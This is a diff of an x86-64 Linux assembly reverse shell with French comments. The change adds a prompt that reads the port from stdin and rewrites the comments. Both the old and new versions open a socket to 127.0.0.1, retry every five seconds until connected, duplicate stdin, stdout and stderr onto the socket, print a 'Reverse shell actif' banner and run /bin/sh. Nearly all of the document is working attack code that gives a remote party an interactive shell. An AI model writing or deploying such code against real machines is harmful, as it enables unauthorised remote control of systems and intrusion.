@@ -1,55 +1,65 @@
 section .bss
-port_buf resb 6            ; buffer pour lecture du port
+port_input resb 6         ; buffer pour lire "4444\n"
 
 section .data
 sockaddr:
-    dw 2                ; AF_INET
-    dw 0x5c11           ; port 4444 (big endian = 0x115c)
-    dd 0x0100007F       ; 127.0.0.1 = 0x7F000001 → 0x0100007F
-    dq 0                ; sin_zero
+    dw 2                  ; AF_INET
+    dw 0                  ; port (sera mis dynamiquement)
+    dd 0x0100007F         ; IP = 127.0.0.1
+    dq 0
 
 shellpath: db "/bin/sh", 0
+
+prompt: db "Port ? ", 0
+prompt_len equ $ - prompt
 
 banner: db 10, 27, "[32m[*] Reverse shell actif. Bienvenue !", 10, 27, "[0m", 10
 banner_len equ $ - banner
 
 timespec_5s:
-    dq 5                ; tv_sec = 5 sec
-    dq 0                ; tv_nsec = 0
+    dq 5
+    dq 0
 
 section .text
 global _start
 
 _start:
-    ; === Lire le port depuis stdin ===
-    mov     rax, 0          ; syscall: read
-    mov     rdi, 0          ; fd = stdin
-    lea     rsi, [rel port_buf]
+    ; afficher le prompt
+    mov     rax, 1              ; syscall write
+    mov     rdi, 1              ; stdout
+    lea     rsi, [rel prompt]
+    mov     rdx, prompt_len
+    syscall
+
+    ; lire l’entrée (ex: 4444\n)
+    mov     rax, 0              ; syscall read
+    mov     rdi, 0              ; stdin
+    lea     rsi, [rel port_input]
     mov     rdx, 6
     syscall
 
-    ; === Parser "4444\n" → 4444 ===
-    xor     rbx, rbx        ; résultat final dans rbx
-    xor     rcx, rcx        ; index
-.parse_loop:
-    mov     al, [port_buf + rcx]
-    cmp     al, 10          ; saut de ligne ?
-    je      .parse_done
-    sub     al, '0'         ; ASCII → chiffre
+    ; convertir ASCII → entier dans rbx
+    xor     rbx, rbx            ; port = 0
+    xor     rcx, rcx            ; index = 0
+.convert_loop:
+    movzx   rax, byte [port_input + rcx]
+    cmp     rax, 10             ; '\n'
+    je      .convert_done
+    sub     rax, '0'
     imul    rbx, rbx, 10
     add     rbx, rax
     inc     rcx
-    cmp     rcx, 6
-    jl      .parse_loop
-.parse_done:
+    cmp     rcx, 5
+    jl      .convert_loop
+.convert_done:
 
-    ; === Convertir en big endian et insérer dans sockaddr ===
+    ; rbx = port, on le convertit en big-endian → ax = 0x5c11
     mov     ax, bx
     xchg    al, ah
-    mov     word [sockaddr + 2], ax
+    mov     word [sockaddr + 2], ax     ; injecter le port dans sockaddr
 
 .retry_connection:
-    ; === socket(AF_INET, SOCK_STREAM, 0) ===
+    ; socket(AF_INET, SOCK_STREAM, 0)
     mov     rax, 41
     mov     rdi, 2
     mov     rsi, 1
@@ -57,7 +67,7 @@ _start:
     syscall
     mov     r12, rax
 
-    ; === connect(socket_fd, &sockaddr, 16) ===
+    ; connect(socket_fd, &sockaddr, 16)
     mov     rax, 42
     mov     rdi, r12
     lea     rsi, [rel sockaddr]
@@ -67,7 +77,7 @@ _start:
     js      .wait_retry
 
 .success_connection:
-    ; === dup2 pour stdin, stdout, stderr ===
+    ; dup2(socket_fd, 0,1,2)
     mov     rsi, 2
 .dup_loop:
     mov     rax, 33
@@ -77,7 +87,7 @@ _start:
     dec     rsi
     jns     .dup_loop
 
-    ; === bannière ===
+    ; write bannière fancy
     mov     rax, 1
     mov     rdi, r12
     lea     rsi, [rel banner]
@@ -85,29 +95,29 @@ _start:
     syscall
 
     ; récupérer envp depuis la stack
-    mov     rbx, [rsp]               ; argc
-    lea     rbx, [rsp + 8 + rbx*8]   ; skip argv + NULL
-    add     rbx, 8                   ; pointe sur envp
+    mov     rbx, [rsp]
+    lea     rbx, [rsp + 8 + rbx*8]
+    add     rbx, 8
 
     ; execve("/bin/sh", NULL, envp)
     mov     rax, 59
     lea     rdi, [rel shellpath]
-    xor     rsi, rsi                ; argv = NULL
-    mov     rdx, rbx                ; envp depuis la stack
+    xor     rsi, rsi
+    mov     rdx, rbx
     syscall
 
-    ; exit(0) si execve échoue
+    ; exit(0)
     mov     rax, 60
     xor     rdi, rdi
     syscall
 
 .wait_retry:
-    ; close(socket_fd)
+    ; close socket
     mov     rax, 3
     mov     rdi, r12
     syscall
 
-    ; nanosleep(5 sec)
+    ; dormir 5 sec
     mov     rax, 35
     lea     rdi, [rel timespec_5s]
     xor     rsi, rsi
